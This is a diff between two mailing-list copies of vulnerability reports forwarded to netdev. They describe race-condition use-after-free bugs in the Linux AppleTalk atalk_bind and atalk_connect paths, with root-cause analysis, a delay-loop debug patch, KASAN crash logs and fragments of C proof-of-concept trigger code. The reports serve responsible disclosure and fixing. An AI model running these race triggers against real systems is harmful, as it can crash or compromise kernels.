@@ -1,37 +1,37 @@
-Return-Path: <netdev+bounces-38740-lists+netdev=lfdr.de@vger.kernel.org>
+Return-Path: <netdev+bounces-38741-lists+netdev=lfdr.de@vger.kernel.org>
 X-Original-To: lists+netdev@lfdr.de
 Delivered-To: lists+netdev@lfdr.de
-Received: from sv.mirrors.kernel.org (sv.mirrors.kernel.org [IPv6:2604:1380:45e3:2400::1])
-	by mail.lfdr.de (Postfix) with ESMTPS id A44AD7BC505
-	for <lists+netdev@lfdr.de>; Sat,  7 Oct 2023 08:35:35 +0200 (CEST)
+Received: from sv.mirrors.kernel.org (sv.mirrors.kernel.org [139.178.88.99])
+	by mail.lfdr.de (Postfix) with ESMTPS id 01C8D7BC506
+	for <lists+netdev@lfdr.de>; Sat,  7 Oct 2023 08:36:35 +0200 (CEST)
 Received: from smtp.subspace.kernel.org (wormhole.subspace.kernel.org [52.25.139.140])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by sv.mirrors.kernel.org (Postfix) with ESMTPS id 633142820FE
-	for <lists+netdev@lfdr.de>; Sat,  7 Oct 2023 06:35:34 +0000 (UTC)
+	by sv.mirrors.kernel.org (Postfix) with ESMTPS id 83C432820D9
+	for <lists+netdev@lfdr.de>; Sat,  7 Oct 2023 06:36:34 +0000 (UTC)
 Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
-	by smtp.subspace.kernel.org (Postfix) with ESMTP id DA4559CA5E;
-	Sat,  7 Oct 2023 06:35:32 +0000 (UTC)
+	by smtp.subspace.kernel.org (Postfix) with ESMTP id 447891FCC;
+	Sat,  7 Oct 2023 06:36:33 +0000 (UTC)
 Authentication-Results: smtp.subspace.kernel.org; dkim=none
 X-Original-To: netdev@vger.kernel.org
 Received: from lindbergh.monkeyblade.net (lindbergh.monkeyblade.net [23.128.96.19])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id A8DF89CA48
-	for <netdev@vger.kernel.org>; Sat,  7 Oct 2023 06:35:30 +0000 (UTC)
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id E65589CA5E
+	for <netdev@vger.kernel.org>; Sat,  7 Oct 2023 06:36:28 +0000 (UTC)
 Received: from 1wt.eu (ded1.1wt.eu [163.172.96.212])
-	by lindbergh.monkeyblade.net (Postfix) with ESMTP id B6C2AB9
-	for <netdev@vger.kernel.org>; Fri,  6 Oct 2023 23:35:26 -0700 (PDT)
+	by lindbergh.monkeyblade.net (Postfix) with ESMTP id BB353C6
+	for <netdev@vger.kernel.org>; Fri,  6 Oct 2023 23:36:25 -0700 (PDT)
 Received: (from willy@localhost)
-	by pcw.home.local (8.15.2/8.15.2/Submit) id 3976ZC8M021157;
-	Sat, 7 Oct 2023 08:35:12 +0200
-Date: Sat, 7 Oct 2023 08:35:12 +0200
+	by pcw.home.local (8.15.2/8.15.2/Submit) id 3976a95K021164;
+	Sat, 7 Oct 2023 08:36:09 +0200
+Date: Sat, 7 Oct 2023 08:36:09 +0200
 From: Willy Tarreau <w@1wt.eu>
 To: netdev@vger.kernel.org
 Cc: rootlab@huawei.com
-Subject: Fwd: Race Condition Vulnerability in atalk_bind of appletalk module
- leading to UAF
-Message-ID: <20231007063512.GQ20998@1wt.eu>
+Subject: Fwd: Race Condition Vulnerability in atalk_connect of appletalk
+ module leading to UAF
+Message-ID: <20231007063609.GR20998@1wt.eu>
 Precedence: bulk
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
@@ -60,101 +60,70 @@ PS: there are 6 reports for atalk in this series.
 
 ----- Forwarded message from rootlab <rootlab@huawei.com> -----
 
-> Date: Sat, 7 Oct 2023 03:08:44 +0000
+> Date: Sat, 7 Oct 2023 03:09:13 +0000
 > From: rootlab <rootlab@huawei.com>
-> Subject: Race Condition Vulnerability in atalk_bind of appletalk module leading to UAF
+> Subject: Race Condition Vulnerability in atalk_connect of appletalk module leading to UAF
 > To: "security@kernel.org" <security@kernel.org>
 > Delivered-To: security@kernel.org
 > 
-> I recently found an race condition Vulnerability in the atalk_bind, which leads to the kernel access free'd stalk_addr object.
+> I recently found an race condition Vulnerability in the atalk_connect, which leads to the kernel access free'd atalk_route object.
 > 
 > The vulnerability code presented below is located in Linux 6.5-rc5, and it is possible that other versions may also be affected.
 > 
 > [Root Cause]
 > 
-> atalk_bind first obtains the lock of the sk, then it call atalk_find_primary to find the ap and use the ap.
+> atalk_connect first obtain the lock of sk, then use atrtr_get_dev to obtain atr from atalk_routes.
 > 
->   *   atalk_bind
+>   *   atalk_connect
 > 
 >      *   lock_sock(sk);
 > 
->      *   struct atalk_addr *ap = atalk_find_primary();
+>      *   atrtr_get_dev
 > 
->         *   return the pointer of iface:&fiface->address
->      *   use ap :at->src_net = addr->sat_addr.s_net = ap->s_net;
-> 
+>         *   struct atalk_route *atr = atrtr_find(sa);
+>         *   return atr ? atr->dev : NULL; // race to uaf
 >      *   release_sock(sk);
 > 
-> atalk_find_primary will search for iface from the atalk_interfaces linked list and finally return &fiface->address
+> atr can be free through ioctl(at_fd, SIOCDIFADDR, &atreq);.
 > 
-> static struct atalk_addr *atalk_find_primary(void)
-> {
->         struct atalk_iface *fiface = NULL;
->         struct atalk_addr *retval;
->         struct atalk_iface *iface;
+> atalk_ioctl
 > 
->         /*
->          * Return a point-to-point interface only if
->          * there is no non-ptp interface available.
->          */
->         read_lock_bh(&atalk_interfaces_lock);
->         for (iface = atalk_interfaces; iface; iface = iface->next) {
->                 if (!fiface && !(iface->dev->flags & IFF_LOOPBACK))
->                         fiface = iface;
->                 if (!(iface->dev->flags & (IFF_LOOPBACK | IFF_POINTOPOINT))) {
->                         retval = &iface->address;
->                         goto out;
->                 }
->         }
+>   *   rtnl_lock();
 > 
->         if (fiface)
->                 retval = &fiface->address;
->         else if (atalk_interfaces)
->                 retval = &atalk_interfaces->address;
->         else
->                 retval = NULL;
-> out:
->         read_unlock_bh(&atalk_interfaces_lock);
->         return retval;
-> }
+>      *   SIOCDIFADDR
 > 
+>         *   atalk_dev_down
 > 
-> iface can be free'd through ioctl(at_fd, SIOCDIFADDR, &atreq);.
+>            *   atrtr_device_down
 > 
->   *   atalk_ioctl
+>               *   kfree(tmp);
+>   *   rtnl_unlock();
 > 
->      *   rtnl_lock();
+> During the atalk_ioctl --> atrtr_device_down process, only the rtnl lock is obtained.
 > 
->      *   atalk_dev_down
+> Inconsistency between the rtnl lock and the atalk_connect lock causes UAF.
 > 
->         *   atif_drop_device
-> 
->            *   kfree(tmp);
->      *   rtnl_unlock();
-> 
-> During the atalk_ioctl --> atif_drop_device process, only the rtnl lock is obtained. Inconsistency between the rtnl lock and the atalk_bind lock causes UAF.
-> 
->                                                   Time
->                                                    +
->                                                    |
-> thread A                                           |  thread B
-> atalk_bind                                         |  ioctl --> atalk_dev_down
->                                                    |
->                                                    |
->   1.struct atalk_addr *ap = atalk_find_primary()   |
->                                                    |
->                                                    |
->                                                    |     2.atif_drop_device(dev)  --> free ap
->                                                    |
->                                                    |
->     // UAF!                                        |
->   3.addr->sat_addr.s_net = ap->s_net;              |
->                                                    +
+>                           Time
+>                            +
+>                            |
+> thread A                   |  thread B
+> atalk_connect              |  ioctl --> atalk_dev_down
+>                            |
+>                            |
+>   1.atr = atrtr_find(sa);  |
+>                            |
+>                            |
+>                            |     2.atrtr_device_down(dev) --> free atr
+>                            |
+>                            |
+>     // UAF!                |
+>   3.return atr ? atr->dev  |
+>                            +
 > 
 > 
 > [Patch Suggestion]
 > 
->   1.  add refcount for struct atalk_addr
+>   1.  add refcount for struct atalk_route
 >   2.  Use the right lock
 > 
 > [Proof-of-Concept]
@@ -163,28 +132,28 @@ PS: there are 6 reports for atalk in this series.
 > 
 > Test Environment:qemu x86_64 + linux 6.5-rc5 + kasan
 > 
-> To increase the probability of race, I add some loops to the race part of the code ( atalk_bind ) to increase the time window.
+> To increase the probability of race, I add some loops to the race part of the code ( atrtr_get_dev ) to increase the time window.
 > 
 > the dxxx() function just do some loop to increase the time window.
 > 
-> From b17fda105378e1f34cf3e27a961ad26fc1ccd100 Mon Sep 17 00:00:00 2001
+> From 015bb1b6834e0abeb87f4f85505b93dfcd69f96e Mon Sep 17 00:00:00 2001
 > From: luosili <rootlab@huawei.com>
-> Date: Wed, 27 Sep 2023 17:12:06 +0800
-> Subject: [PATCH] appletalk: patch for race in atalk_bind
+> Date: Wed, 27 Sep 2023 17:16:32 +0800
+> Subject: [PATCH] appletalk: patch for race in atalk_connect
 > 
 > add some loop for race.
 > 
 > Signed-off-by: luosili <rootlab@huawei.com>
 > ---
->  net/appletalk/ddp.c | 17 +++++++++++++++++
->  1 file changed, 17 insertions(+)
+>  net/appletalk/ddp.c | 15 +++++++++++++++
+>  1 file changed, 15 insertions(+)
 > 
 > diff --git a/net/appletalk/ddp.c b/net/appletalk/ddp.c
-> index 8978fb6212ff..a7a43a0dcea4 100644
+> index 8978fb6212ff..c27244ae1352 100644
 > --- a/net/appletalk/ddp.c
 > +++ b/net/appletalk/ddp.c
-> @@ -1134,6 +1134,19 @@ static int atalk_autobind(struct sock *sk)
->         return n;
+> @@ -468,6 +468,18 @@ static struct atalk_route *atrtr_find(struct atalk_addr *target)
+>         return r;
 >  }
 > 
 > +#pragma GCC push_options
@@ -199,23 +168,19 @@ PS: there are 6 reports for atalk in this series.
 > +       return xxx;
 > +}
 > +#pragma GCC pop_options
-> +
->  /* Set the address 'our end' of the connection */
->  static int atalk_bind(struct socket *sock, struct sockaddr *uaddr, int addr_len)
->  {
-> @@ -1157,8 +1170,12 @@ static int atalk_bind(struct socket *sock, struct sockaddr *uaddr, int addr_len)
->                 if (!ap)
->                         goto out;
 > 
-> +               printk("vuln: [atalk_bind] %llx\n", (uint64_t)ap);
-> +               dxxx();
-> +
->                 at->src_net  = addr->sat_addr.s_net = ap->s_net;
->                 at->src_node = addr->sat_addr.s_node = ap->s_node;
-> +               printk("vuln: [atalk_bind] after use %llx\n", (uint64_t)ap);
->         } else {
->                 err = -EADDRNOTAVAIL;
->                 if (!atalk_find_interface(addr->sat_addr.s_net,
+>  /*
+>   * Given an AppleTalk network, find the device to use. This can be
+> @@ -476,6 +488,9 @@ static struct atalk_route *atrtr_find(struct atalk_addr *target)
+>  struct net_device *atrtr_get_dev(struct atalk_addr *sa)
+>  {
+>         struct atalk_route *atr = atrtr_find(sa);
+> +       printk("vuln: [atrtr_get_dev] %llx\n", (uint64_t)atr);
+> +       dxxx();
+> +       printk("vuln: [atrtr_get_dev] do use %llx\n", (uint64_t)atr);
+>         return atr ? atr->dev : NULL;
+>  }
+> 
 > --
 > 2.25.1
 > 
@@ -223,104 +188,114 @@ PS: there are 6 reports for atalk in this series.
 > 
 > panic log
 > 
-> # /tmp/atalk_search_socket
-> fd: 3
-> [15244.076820] vuln: [atalk_bind] ffff8880079f4748
-> [15244.504286] ==================================================================
-> [15244.504882] BUG: KASAN: slab-use-after-free in atalk_bind+0x198/0x3d0 [appletalk]
-> [15244.505447] Read of size 2 at addr ffff8880079f4748 by task atalk_search_so/240
-> [15244.505974]
-> [15244.506102] CPU: 1 PID: 240 Comm: atalk_search_so Tainted: G           OE      6.5.0-rc5 #7
-> [15244.506695] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014
-> [15244.507325] Call Trace:
-> [15244.507507]  <TASK>
-> [15244.507670]  dump_stack_lvl+0x4c/0x70
-> [15244.507961]  print_report+0xd3/0x620
-> [15244.508237]  ? kasan_complete_mode_report_info+0x7d/0x200
-> [15244.508626]  ? atalk_bind+0x198/0x3d0 [appletalk]
-> [15244.508980]  kasan_report+0xc2/0x100
-> [15244.509240]  ? atalk_bind+0x198/0x3d0 [appletalk]
-> [15244.509591]  __asan_load2+0x7d/0xb0
-> [15244.509846]  atalk_bind+0x198/0x3d0 [appletalk]
-> [15244.510181]  ? apparmor_socket_bind+0x2f/0x40
-> [15244.510512]  __sys_bind+0x19f/0x1c0
-> [15244.510778]  ? __pfx___sys_bind+0x10/0x10
-> [15244.511074]  ? __kasan_check_write+0x18/0x20
-> [15244.511389]  ? kfree+0x7a/0x120
-> [15244.511634]  ? __kasan_check_read+0x15/0x20
-> [15244.511932]  ? fpregs_assert_state_consistent+0x62/0x70
-> [15244.512315]  ? exit_to_user_mode_prepare+0x3d/0x190
-> [15244.512679]  __x64_sys_bind+0x47/0x60
-> [15244.512950]  do_syscall_64+0x60/0x90
-> [15244.513218]  ? syscall_exit_to_user_mode+0x2a/0x50
-> [15244.513567]  ? ret_from_fork+0x2d/0x70
-> [15244.513847]  entry_SYSCALL_64_after_hwframe+0x6e/0xd8
-> [15244.514245] RIP: 0033:0x46054b
-> [15244.514492] Code: 73 01 c3 48 c7 c1 b8 ff ff ff f7 d8 64 89 01 48 83 c8 ff c3 66 2e 0f 1f 84 00 00 00 00 00 90 f3 0f 1e fa b8 31 00 00 00 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 c7 c1 b8 ff ff ff f7 d8 64 89 01 48
-> [15244.515817] RSP: 002b:00007fbd78928d78 EFLAGS: 00000246 ORIG_RAX: 0000000000000031
-> [15244.516379] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 000000000046054b
-> [15244.516895] RDX: 0000000000000010 RSI: 00007fbd78928d90 RDI: 0000000000000003
-> [15244.517417] RBP: 00007fbd78928db0 R08: 0000000000000000 R09: 00007fbd78929700
-> [15244.517940] R10: 00007fbd789299d0 R11: 0000000000000246 R12: 00007ffc941dd58e
-> [15244.518459] R13: 00007ffc941dd58f R14: 00007ffc941dd590 R15: 00007fbd78928e80
-> [15244.519007]  </TASK>
-> [15244.519178]
-> [15244.519301] Allocated by task 238:
-> [15244.519563]  kasan_save_stack+0x2a/0x50
-> [15244.519904]  kasan_set_track+0x29/0x40
-> [15244.520184]  kasan_save_alloc_info+0x1f/0x30
-> [15244.520499]  __kasan_kmalloc+0xb5/0xc0
-> [15244.520777]  kmalloc_trace+0x4e/0xb0
-> [15244.521044]  atif_ioctl+0x900/0xaf0 [appletalk]
-> [15244.521388]  atalk_ioctl+0x124/0x1e0 [appletalk]
-> [15244.521739]  sock_do_ioctl+0xb9/0x1a0
-> [15244.522015]  sock_ioctl+0x1b1/0x420
-> [15244.522280]  __x64_sys_ioctl+0xd1/0x110
-> [15244.522565]  do_syscall_64+0x60/0x90
-> [15244.522827]  entry_SYSCALL_64_after_hwframe+0x6e/0xd8
-> [15244.523195]
-> [15244.523314] Freed by task 239:
-> [15244.523543]  kasan_save_stack+0x2a/0x50
-> [15244.523818]  kasan_set_track+0x29/0x40
-> [15244.524091]  kasan_save_free_info+0x2f/0x50
-> [15244.524390]  __kasan_slab_free+0x12e/0x1c0
-> [15244.524684]  __kmem_cache_free+0x1b9/0x380
-> [15244.524981]  kfree+0x7a/0x120
-> [15244.525203]  atif_drop_device+0xad/0x100 [appletalk]
-> [15244.525574]  atif_ioctl+0x1f5/0xaf0 [appletalk]
-> [15244.525917]  atalk_ioctl+0x124/0x1e0 [appletalk]
-> [15244.526259]  sock_do_ioctl+0xb9/0x1a0
-> [15244.526542]  sock_ioctl+0x1b1/0x420
-> [15244.526804]  __x64_sys_ioctl+0xd1/0x110
-> [15244.527090]  do_syscall_64+0x60/0x90
-> [15244.527353]  entry_SYSCALL_64_after_hwframe+0x6e/0xd8
-> [15244.527708]
-> [15244.527828] The buggy address belongs to the object at ffff8880079f4740
-> [15244.527828]  which belongs to the cache kmalloc-32 of size 32
-> [15244.528697] The buggy address is located 8 bytes inside of
-> [15244.528697]  freed 32-byte region [ffff8880079f4740, ffff8880079f4760)
-> [15244.529545]
-> [15244.529666] The buggy address belongs to the physical page:
-> [15244.530066] page:00000000b8b37d3c refcount:1 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x79f4
-> [15244.530742] flags: 0xfffffc0000200(slab|node=0|zone=1|lastcpupid=0x1fffff)
-> [15244.531244] page_type: 0xffffffff()
-> [15244.531524] raw: 000fffffc0000200 ffff888006842500 dead000000000100 dead000000000122
-> [15244.532079] raw: 0000000000000000 0000000080400040 00000001ffffffff 0000000000000000
-> [15244.532639] page dumped because: kasan: bad access detected
-> [15244.533040]
-> [15244.533160] Memory state around the buggy address:
-> [15244.533511]  ffff8880079f4600: fb fb fb fb fc fc fc fc fb fb fb fb fc fc fc fc
-> [15244.534037]  ffff8880079f4680: fa fb fb fb fc fc fc fc 00 00 03 fc fc fc fc fc
-> [15244.534564] >ffff8880079f4700: fa fb fb fb fc fc fc fc fa fb fb fb fc fc fc fc
-> [15244.535086]                                               ^
-> [15244.535493]  ffff8880079f4780: fa fb fb fb fc fc fc fc 00 00 03 fc fc fc fc fc
-> [15244.536015]  ffff8880079f4800: 00 00 00 02 fc fc fc fc fb fb fb fb fc fc fc fc
-> [15244.536534] ==================================================================
-> [15244.537085] Disabling lock debugging due to kernel taint
-> [15244.537478] vuln: [atalk_bind] after use ffff8880079f4748
-> use done
-> #
 > 
+> # /tmp/atalk_connect
+> fd: 3
+> use done
+> [43541.222459] vuln: [atrtr_get_dev] ffff8880079e1cc0
+> [43541.712371] vuln: [atrtr_get_dev] do use ffff8880079e1cc0
+> [43541.713198] ==================================================================
+> [43541.713963] BUG: KASAN: slab-use-after-free in atrtr_get_dev+0x47/0x60 [appletalk]
+> [43541.714780] Read of size 8 at addr ffff8880079e1cc0 by task atalk_connect/338
+> [43541.715536]
+> [43541.715711] CPU: 1 PID: 338 Comm: atalk_connect Tainted: G           OE      6.5.0-rc5 #7
+> [43541.716516] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014
+> [43541.717422] Call Trace:
+> [43541.717693]  <TASK>
+> [43541.717916]  dump_stack_lvl+0x4c/0x70
+> [43541.718305]  print_report+0xd3/0x620
+> [43541.718669]  ? kasan_complete_mode_report_info+0x7d/0x200
+> [43541.719188]  ? atrtr_get_dev+0x47/0x60 [appletalk]
+> [43541.719702]  kasan_report+0xc2/0x100
+> [43541.720128]  ? atrtr_get_dev+0x47/0x60 [appletalk]
+> [43541.720637]  __asan_load8+0x82/0xb0
+> [43541.720980]  atrtr_get_dev+0x47/0x60 [appletalk]
+> [43541.721413]  atalk_connect+0xcb/0x210 [appletalk]
+> [43541.721848]  ? apparmor_socket_connect+0x2f/0x40
+> [43541.722421]  __sys_connect_file+0xd1/0xf0
+> [43541.722870]  ? __pfx_atalk_connect+0x10/0x10 [appletalk]
+> [43541.723462]  __sys_connect+0x114/0x140
+> [43541.723862]  ? __pfx___sys_connect+0x10/0x10
+> [43541.724334]  ? __kasan_slab_free+0x139/0x1c0
+> [43541.724791]  ? free_cpumask_var+0xd/0x20
+> [43541.725219]  ? __pfx_restore_fpregs_from_fpstate+0x10/0x10
+> [43541.725818]  ? __kasan_check_write+0x18/0x20
+> [43541.726280]  __x64_sys_connect+0x47/0x60
+> [43541.726711]  do_syscall_64+0x60/0x90
+> [43541.727117]  ? syscall_exit_to_user_mode+0x2a/0x50
+> [43541.727630]  ? do_syscall_64+0x6d/0x90
+> [43541.728030]  ? __kasan_check_read+0x15/0x20
+> [43541.728486]  ? fpregs_assert_state_consistent+0x62/0x70
+> [43541.729058]  ? exit_to_user_mode_prepare+0x3d/0x190
+> [43541.729592]  ? syscall_exit_to_user_mode+0x2a/0x50
+> [43541.730115]  ? do_syscall_64+0x6d/0x90
+> [43541.730527]  ? syscall_exit_to_user_mode+0x2a/0x50
+> [43541.731035]  ? ret_from_fork+0x2d/0x70
+> [43541.731305]  entry_SYSCALL_64_after_hwframe+0x6e/0xd8
+> [43541.731746] RIP: 0033:0x406dfb
+> [43541.732058] Code: 83 ec 18 89 54 24 0c 48 89 34 24 89 7c 24 08 e8 0b fd ff ff 8b 54 24 0c 48 8b 34 24 41 89 c0 8b 7c 24 08 b8 2a 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 2f 44 89 c7 89 44 24 08 e8 41 fd ff ff 8b 44
+> [43541.733896] RSP: 002b:00007ff49ed5ad70 EFLAGS: 00000293 ORIG_RAX: 000000000000002a
+> [43541.734678] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 0000000000406dfb
+> [43541.735389] RDX: 0000000000000010 RSI: 00007ff49ed5ad90 RDI: 0000000000000003
+> [43541.736116] RBP: 00007ff49ed5adb0 R08: 0000000000000000 R09: 00007ff49ed5b700
+> [43541.736842] R10: 00007ff49ed5b9d0 R11: 0000000000000293 R12: 00007fffb962df1e
+> [43541.737593] R13: 00007fffb962df1f R14: 00007fffb962df20 R15: 00007ff49ed5ae80
+> [43541.738328]  </TASK>
+> [43541.738568]
+> [43541.738746] Allocated by task 336:
+> [43541.739138]  kasan_save_stack+0x2a/0x50
+> [43541.739669]  kasan_set_track+0x29/0x40
+> [43541.741599]  kasan_save_alloc_info+0x1f/0x30
+> [43541.741984]  __kasan_kmalloc+0xb5/0xc0
+> [43541.742391]  kmalloc_trace+0x4e/0xb0
+> [43541.742759]  atrtr_create+0x29a/0x3e0 [appletalk]
+> [43541.743199]  atif_ioctl+0x45c/0x6c0 [appletalk]
+> [43541.743629]  atalk_ioctl+0x124/0x1e0 [appletalk]
+> [43541.744086]  sock_do_ioctl+0xb9/0x1a0
+> [43541.744445]  sock_ioctl+0x1b1/0x420
+> [43541.744772]  __x64_sys_ioctl+0xd1/0x110
+> [43541.745139]  do_syscall_64+0x60/0x90
+> [43541.745633]  entry_SYSCALL_64_after_hwframe+0x6e/0xd8
+> [43541.746253]
+> [43541.746419] Freed by task 337:
+> [43541.746777]  kasan_save_stack+0x2a/0x50
+> [43541.747179]  kasan_set_track+0x29/0x40
+> [43541.747556]  kasan_save_free_info+0x2f/0x50
+> [43541.747977]  __kasan_slab_free+0x12e/0x1c0
+> [43541.748397]  __kmem_cache_free+0x1b9/0x380
+> [43541.748810]  kfree+0x7a/0x120
+> [43541.749144]  atrtr_device_down+0xab/0x120 [appletalk]
+> [43541.749591]  atif_ioctl+0x1db/0x6c0 [appletalk]
+> [43541.749986]  atalk_ioctl+0x124/0x1e0 [appletalk]
+> [43541.750373]  sock_do_ioctl+0xb9/0x1a0
+> [43541.750694]  sock_ioctl+0x1b1/0x420
+> [43541.750995]  __x64_sys_ioctl+0xd1/0x110
+> [43541.751319]  do_syscall_64+0x60/0x90
+> [43541.751662]  entry_SYSCALL_64_after_hwframe+0x6e/0xd8
+> [43541.752099]
+> [43541.752262] The buggy address belongs to the object at ffff8880079e1cc0
+> [43541.752262]  which belongs to the cache kmalloc-32 of size 32
+> [43541.753428] The buggy address is located 0 bytes inside of
+> [43541.753428]  freed 32-byte region [ffff8880079e1cc0, ffff8880079e1ce0)
+> [43541.754380]
+> [43541.754507] The buggy address belongs to the physical page:
+> [43541.754912] page:0000000090d1c415 refcount:1 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x79e1
+> [43541.755592] flags: 0xfffffc0000200(slab|node=0|zone=1|lastcpupid=0x1fffff)
+> [43541.756080] page_type: 0xffffffff()
+> [43541.756358] raw: 000fffffc0000200 ffff888006842500 ffffea00001fbf80 dead000000000002
+> [43541.757002] raw: 0000000000000000 0000000080400040 00000001ffffffff 0000000000000000
+> [43541.757761] page dumped because: kasan: bad access detected
+> [43541.758315]
+> [43541.758480] Memory state around the buggy address:
+> [43541.758965]  ffff8880079e1b80: fa fb fb fb fc fc fc fc fb fb fb fb fc fc fc fc
+> [43541.759665]  ffff8880079e1c00: fa fb fb fb fc fc fc fc 00 00 00 fc fc fc fc fc
+> [43541.760348] >ffff8880079e1c80: fb fb fb fb fc fc fc fc fa fb fb fb fc fc fc fc
+> [43541.761090]                                            ^
+> [43541.761609]  ffff8880079e1d00: fa fb fb fb fc fc fc fc fb fb fb fb fc fc fc fc
+> [43541.762223]  ffff8880079e1d80: 00 00 00 fc fc fc fc fc fa fb fb fb fc fc fc fc
+> [43541.762896] ==================================================================
+> [43541.763645] Disabling lock debugging due to kernel taint
+> #
 > 
 > 
 > [CREDIT]
@@ -376,6 +351,7 @@ PS: there are 6 reports for atalk in this series.
 > #include <stdlib.h>
 > #include <string.h>
 > #include <sys/socket.h>
+> #include <net/route.h>
 > 
 > 
 > void pincpu(int cpu) {
@@ -419,11 +395,10 @@ PS: there are 6 reports for atalk in this series.
 > 
 >   struct sockaddr_at addr = {0};
 >   addr.sat_family = AF_APPLETALK;           // ?????
->   addr.sat_addr.s_net == htons(ATADDR_ANYNET); // ????
+>   addr.sat_addr.s_net == 0x33;
+>   addr.sat_addr.s_node == 0x32;
 >   addr.sat_port == 0;
->   int bind_res = bind(at_fd, (struct sockaddr *)&addr, sizeof(addr));
-> 
->   puts("use done");
+>   connect(at_fd, (struct sockaddr *)&addr, sizeof(addr));
 > }
 > 
 > #define ETH_P_X25 0x0805
@@ -552,12 +527,28 @@ PS: there are 6 reports for atalk in this series.
 > 
 >   ioctl(at_fd, SIOCSIFADDR, &atreq);
 > 
+>   struct rtentry rt = {0};
+>   char name[] = "lo";
+>   rt.rt_dev = name;
+> 
+>         struct sockaddr_at *ta = (struct sockaddr_at *)&rt.rt_dst;
+>         struct sockaddr_at *ga = (struct sockaddr_at *)&rt.rt_gateway;
+>   ta->sat_family = AF_APPLETALK;
+>   ga->sat_family = AF_APPLETALK;
+>   ta->sat_addr.s_net = 0x33;
+>   ta->sat_addr.s_node = 0x32;
 > 
 > 
+>   ioctl(at_fd, SIOCADDRT, &rt);
+> 
+> 
+> 
+> 
+>   puts("use done");
 > 
 > //   send_pkt2();
 > 
-> //   return;
+>   // return;
 > 
 >   pthread_barrier_init(&barrier, NULL, THREAD_NUMS);
 > 
